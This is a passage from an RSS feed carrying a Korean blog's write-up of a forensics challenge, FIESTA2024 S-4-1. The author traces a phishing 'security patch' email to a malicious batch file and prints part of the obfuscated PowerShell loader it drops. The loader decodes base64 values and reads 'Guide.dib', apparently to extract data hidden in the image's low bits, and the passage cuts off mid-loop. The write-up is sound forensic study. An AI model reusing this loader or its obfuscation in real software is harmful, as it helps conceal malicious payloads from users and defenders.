        <pubDate>Tue, 28 Jan 2025 09:00:01 -0600</pubDate>
        <link>https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2</guid>
      </item>
    
      <item>
        <title>FIESTA2024 S-4-1 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-접근&quot; id=&quot;markdown-toc-0-접근&quot;&gt;0. 접근&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-악성-파일-분석&quot; id=&quot;markdown-toc-1-악성-파일-분석&quot;&gt;1. 악성 파일 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-쉘-스크립트-난독화-기법&quot; id=&quot;markdown-toc-2-쉘-스크립트-난독화-기법&quot;&gt;2. 쉘 스크립트 난독화 기법&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-악성코드는-왜-쉘스크립트를-사용할까&quot; id=&quot;markdown-toc-21-악성코드는-왜-쉘스크립트를-사용할까&quot;&gt;2.1. 악성코드는 왜 쉘스크립트를 사용할까?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-악성코드가-쉘스크립트를-사용할-때의-동작-단계-구성&quot; id=&quot;markdown-toc-22-악성코드가-쉘스크립트를-사용할-때의-동작-단계-구성&quot;&gt;2.2. 악성코드가 쉘스크립트를 사용할 때의 동작 단계 구성&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-쉘-스크립트-난독화-파훼&quot; id=&quot;markdown-toc-23-쉘-스크립트-난독화-파훼&quot;&gt;2.3. 쉘 스크립트 난독화 파훼&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#231-powershell-로깅-설정&quot; id=&quot;markdown-toc-231-powershell-로깅-설정&quot;&gt;2.3.1. PowerShell 로깅 설정&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#232-powershell-로깅-설정-변경&quot; id=&quot;markdown-toc-232-powershell-로깅-설정-변경&quot;&gt;2.3.2. PowerShell 로깅 설정 변경&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#233-sysmon을-활용한-백그라운드-동작-탐지&quot; id=&quot;markdown-toc-233-sysmon을-활용한-백그라운드-동작-탐지&quot;&gt;2.3.3. Sysmon을 활용한 백그라운드 동작 탐지&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-분석&quot; id=&quot;markdown-toc-3-분석&quot;&gt;3. 분석&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;notice--primary&quot;&gt;

&lt;p&gt;
    &lt;strong&gt;이 문제를 풀지 못했던 이유와 주요 학습 사항&lt;/strong&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
    실제로 다운로드받는 파일의 일부만을 복호화해 사용한다면, 나머지 부분에 대해서도 의심했어야 한다. 
    &lt;ul&gt;
        &lt;li&gt;
            &lt;p&gt;이런 의심은 추후 실무상의 어떤 케이스에서 도움이 될 수 있는가?&lt;/p&gt;
            &lt;p&gt;→ 이건 실무상의 도움이라기보다는 문제에서 ‘쉘스크립트를 제대로 이해할 수 있는지’ 여부를 판단하기 위한 조건이었던 것 같음.&lt;/p&gt;
            &lt;p&gt;→ 따라서 문제 풀이를 위한 스킬인 것으로 보임… 잘 기억해둘 것.&lt;/p&gt;
        &lt;/li&gt;
    &lt;/ul&gt;
&lt;/li&gt;
    &lt;li&gt;
        파워쉘 스크립트 난독화로 인해 해당 코드의 상세 내용을 들여다볼 생각을 하지 못했다. 
        &lt;ul&gt;
            &lt;li&gt;
                난독화가 되어 있는 경우, ‘주요 부분’ 에 대해 난독화를 해제해야 명확한 인과 분석이 가능하다. 
                &lt;ul&gt;
                    &lt;li&gt;
                        &lt;p&gt;‘주요 부분’ 이란 어떤 기준으로 결정 가능한가?&lt;/p&gt;
                        &lt;p&gt;
                            → &lt;strong&gt;해당 스크립트가 수행하는 핵심 기능에 입력되는 값이 거치는 부분&lt;/strong&gt;
                        &lt;/p&gt;
                    &lt;/li&gt;
                    &lt;li&gt;
                        &lt;p&gt;파워쉘 난독화 해제를 자동화할 수 있는 방법이 존재하는가?&lt;/p&gt;
                        &lt;p&gt;→ 어느 정도는. 그러나 이건 디코딩된 데이터가 파워쉘에서 실행되었을 때만 가능&lt;/p&gt;
                        &lt;p&gt;→ 즉 단순히 변수명과 정수값 정도를 난독화한 것(프론트엔드 보안에서 js 난독화하는 것처럼)의 복호화는 딱히 자동화할 방법이 없음&lt;/p&gt;
                    &lt;/li&gt;
                &lt;/ul&gt;
            &lt;/li&gt;
        &lt;/ul&gt;
    &lt;/li&gt;
&lt;/ul&gt;
            
&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;문제&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;DH회사의 신입사원 김모씨는 재택근무를 하던 도중, 사내 긴급 보안 패치와 관련된 내용이 담긴 이메일을 받게 되었다. 메일에 나와있는 방식대로 보안패치를 한 김모씨는 어느순간부터 컴퓨터가 원하지 않는 행동을 수행하는 것을 느꼈다.
김모씨는 이를 이상하게 여겨 분석을 의뢰 맡기게 되었다.&lt;/p&gt;

  &lt;p&gt;시나리오 S-4-1 문제 : Lsb의 비밀&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-접근&quot;&gt;0. 접근&lt;/h1&gt;

&lt;p&gt;FTK Imger로 작성된 이미지 파일이므로 FTK Imager를 활용해 분석했다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Basic Data Partition(3) → root → Users → Documents → em&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;보통 microsoft 쪽 응용은 사용자 폴더의 Documents 하위에 파일을 저장하는 경우가 많고, 회사에서 사용하는 메일 응용이라면 Outlook일 가능성이 높아 저기부터 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;시나리오 설명에 나온 것과 같이 보안 권고 관련 이메일 파일을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 두 메일 파일을 추출해 systools로 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%201.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;첨부된 patch guide 내부의 파일을 추출하여 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%202.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%203.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, 함께 첨부된 배치 파일을 분석하는 것으로 목표가 변경되었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-악성-파일-분석&quot;&gt;1. 악성 파일 분석&lt;/h1&gt;

&lt;p&gt;해당 배치파일을 실행한 후 hidden 속성으로 함께 드롭된 파일(powershell.ps1)을 편집용으로 열어 보면, 아래의 쉘 스크립트를 보게 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$wqeiuyorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MTgzMDQ=&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqei1u16yorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MzA=&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqei1xca16yorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MA==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aqeuijfnbzcxuiv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;OA==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uqiwebuibzxcuyb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqeiuyorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zeqwbeuibyxuygb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqei1u16yorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqei1xca16yorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zy3evbzqvwtg487asgb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aqeuijfnbzcxuiv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aefnmlksadasdkljfqewornzxc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;R3VpZGUuZGli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqeiuyorczxasdkfjhzxbme&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aefnmlksadasdkljfqewornzxc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QxDrTjYnMvLpHsKjRbWfNgZcVxSbQxWpHfJz&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqeiuyorczxasdkfjhzxbme&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PkVmJnLdQzThPwYsNcXfLuRsWvCdGmJbZtRp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.IO.File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QxDrTjYnMvLpHsKjRbWfNgZcVxSbQxWpHfJz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JbPfQrHlMkZsBxCyNdWhGtQxLuVtRqYpWtXp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3025&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NcYpQzVtFrJdLhSkWtMxKvGsRhCtNxWpQsBd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XrBnCdVwYsQtJkWzPrLpMfSnThXvGjRmYqVk&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QrJtFvNpBwXsLnKgUvHpRcMzLkYvGtTzScXf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LmWtZxVpQjTsCnRyMvLpJkNxSrUtGhHfRcKs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JbPfQrHlMkZsBxCyNdWhGtQxLuVtRqYpWtXp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XrBnCdVwYsQtJkWzPrLpMfSnThXvGjRmYqVk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QrJtFvNpBwXsLnKgUvHpRcMzLkYvGtTzScXf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NcYpQzVtFrJdLhSkWtMxKvGsRhCtNxWpQsBd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zeqwbeuibyxuygb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MpQsBnLjHtVrXpWdNgZkTqScRmVlPyKtWhXc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Collections.ArrayList&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LpWqXtNzJsVcKfRvQpTdBvGhXcJkMtWrXf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LmWtZxVpQjTsCnRyMvLpJkNxSrUtGhHfRcKs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LpWqXtNzJsVcKfRvQpTdBvGhXcJkMtWrXf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-lt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uqiwebuibzxcuyb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LpWqXtNzJsVcKfRvQpTdBvGhXcJkMtWrXf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
